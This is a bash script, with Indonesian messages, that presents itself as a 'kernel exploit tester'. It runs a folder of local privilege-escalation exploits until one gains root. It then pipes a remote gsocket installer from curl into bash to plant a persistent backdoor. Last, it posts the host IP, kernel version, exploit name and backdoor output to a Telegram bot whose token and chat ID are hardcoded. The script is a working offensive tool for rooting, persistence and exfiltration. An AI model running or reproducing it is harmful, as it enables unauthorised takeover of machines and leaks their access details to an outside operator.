#!/bin/bash
# ═══════════════════════════════════════════
#  Nullcyber Roting — Kernel Exploit Tester
#  Run: bash roting.sh
# ═══════════════════════════════════════════

# ====== CONFIG ======
BOT_TOKEN="8591058785:AAEO4kDlL7kCNW6HXa0wnZ4b9-qhYLMF65s"
CHAT_ID="1883446251"
XPL_DIR="$(cd "$(dirname "$0")/xpl2026" && pwd)"
TIMEOUT_SEC=90
# ==== END CONFIG ====

RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
CYAN="\033[0;36m"
NC="\033[0m"

banner() {
    echo -e "${RED}"
    echo "+==========================================+"
    echo "|   ☠  NULLCYBER ROTING — Kernel Tester  ☠  |"
    echo "+==========================================+"
    echo -e "${NC}"
}

sys_info() {
    echo -e "${CYAN}[*] System Info:${NC}"
    echo -e "    IP      : $(hostname -I | awk '{print $1}')"
    echo -e "    Kernel  : $(uname -r)"
    echo -e "    Arch    : $(uname -m)"
    echo -e "    Hostname: $(hostname)"
    echo -e "    User    : $(whoami)"
    echo
}

tg_send() {
    local msg="$1"
    if [[ -z "$BOT_TOKEN" || -z "$CHAT_ID" ]]; then
        echo -e "${YELLOW}[!] Telegram skipped — token/chat_id kosong${NC}"
        return 1
    fi
    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
        -H "Content-Type: application/json" \
        -d "{\"chat_id\": \"${CHAT_ID}\", \"text\": \"${msg}\"}" > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}    [✓] Notifikasi terkirim ke Telegram${NC}"
    else
        echo -e "${RED}    [✗] Notifikasi GAGAL${NC}"
    fi
}

check_root() {
    local id_out
    id_out=$(id 2>/dev/null)
    if [[ "$id_out" =~ euid=0 ]] || [[ "$(whoami)" == "root" ]]; then
        return 0
    fi
    return 1
}

run_one() {
    local exp="$1"
    local exp_path="${XPL_DIR}/${exp}"

    echo -ne "${YELLOW}[→] ${exp} ... ${NC}"

    chmod +x "$exp_path" 2>/dev/null

    cd "$XPL_DIR" || return 1
    local out
    out=$(timeout $TIMEOUT_SEC "./$exp" 2>&1)
    cd - > /dev/null || return 1

    if check_root; then
        echo -e "${GREEN}ROOT ✓${NC}"
        echo "$out" | head -20 | sed 's/^/     /'

        local ip kern
        ip=$(hostname -I | awk '{print $1}')
        kern=$(uname -r)

        echo -e "${CYAN}[+] Menginstall Gsocket...${NC}"
        local gsocket_out
        gsocket_out=$(bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1)
        echo "$gsocket_out" | head -5 | sed 's/^/     /'

        local tg_msg
        tg_msg=$'====Nullcyber Roting====\n'
        tg_msg+="IP: ${ip}"$'\n'
        tg_msg+="Kernel: ${kern}"$'\n'
        tg_msg+="Status: rooting"$'\n'
        tg_msg+="Exploit: ${exp}"$'\n'
        tg_msg+="Gsocket rooting:"$'\n'
        tg_msg+="${gsocket_out}"$'\n'
        tg_msg+=$'============\n'

        tg_send "$tg_msg"
        return 0
    else
        echo -e "${RED}GAGAL${NC}"
        echo "$out" | tail -5 | sed 's/^/     /'
        return 1
    fi
}

run_all() {
    echo -e "${YELLOW}[▶] Memulai scan SEMUA exploit...${NC}"
    echo "+==========================================+"

    local total=0

    local exploits
    mapfile -t exploits < <(find "$XPL_DIR" -maxdepth 1 -type f ! -name ".*" ! -name "*.md" ! -name "*.sh" ! -name "*.py" ! -name "Dockerfile" ! -name "Makefile" ! -name "exploit" | sort)

    for exp_path in "${exploits[@]}"; do
        local exp_name
        exp_name=$(basename "$exp_path")
        total=$((total + 1))

        if run_one "$exp_name"; then
            echo
            echo -e "${GREEN}+========= ROOT BERHASIL ==========+"
            echo -e "${GREEN}|  Exploit : ${exp_name}"
            echo -e "${GREEN}|  Total   : ${total} exploit dicoba"
            echo -e "${GREEN}+=========================================+${NC}"
            echo
            return 0
        fi
        echo
    done

    echo -e "${RED}"
    echo "+==========================================+"
    echo "   ✗ SEMUA GAGAL — kernel tidak rentan"
    echo "   Total dicoba: ${total} exploit"
    echo "+==========================================+"
    echo -e "${NC}"
}

# ======== MAIN ========
banner
sys_info

if [[ ! -d "$XPL_DIR" ]]; then
    echo -e "${RED}[✗] Folder ${XPL_DIR} tidak ditemukan!${NC}"
    exit 1
fi

cnt=$(find "$XPL_DIR" -maxdepth 1 -type f ! -name ".*" ! -name "*.md" ! -name "*.sh" ! -name "*.py" ! -name "Dockerfile" ! -name "Makefile" ! -name "exploit" | wc -l)
echo -e "    XPL dir  : ${XPL_DIR}"
echo -e "    Exploits : ${cnt} binary"
echo

if [[ -n "$1" ]]; then
    if [[ -f "${XPL_DIR}/${1}" ]]; then
        run_one "$1"
    else
        echo -e "${RED}[✗] Exploit '$1' tidak ditemukan${NC}"
        exit 1
    fi
else
    run_all
fi